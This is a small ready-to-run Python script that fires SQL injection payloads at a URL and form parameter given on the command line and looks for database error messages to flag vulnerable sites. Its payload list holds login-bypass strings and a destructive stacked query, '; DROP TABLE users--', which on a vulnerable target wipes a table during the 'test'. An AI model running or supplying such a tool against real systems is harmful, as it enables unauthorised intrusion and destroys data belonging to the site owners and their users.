#!/usr/bin/env python3
import requests
import sys

def test_sqli(url, param):
    """Test for SQL injection vulnerabilities"""
    payloads = [
        "'",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE users--"
    ]

    for payload in payloads:
        try:
            data = {param: payload}
            r = requests.post(url, data=data, timeout=10)

            # Check for SQL errors in response
            errors = [
                "SQL syntax",
                "mysql_fetch",
                "Warning: mysql",
                "ORA-",
                "PostgreSQL query failed"
            ]

            for error in errors:
                if error.lower() in r.text.lower():
                    print(f"[!] Potential SQLi found with: {payload}")
                    return True

        except requests.RequestException as e:
            print(f"Error: {e}")

    print("[-] No SQLi detected")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 sqli_tester.py <url> <parameter>")
        sys.exit(1)

    test_sqli(sys.argv[1], sys.argv[2])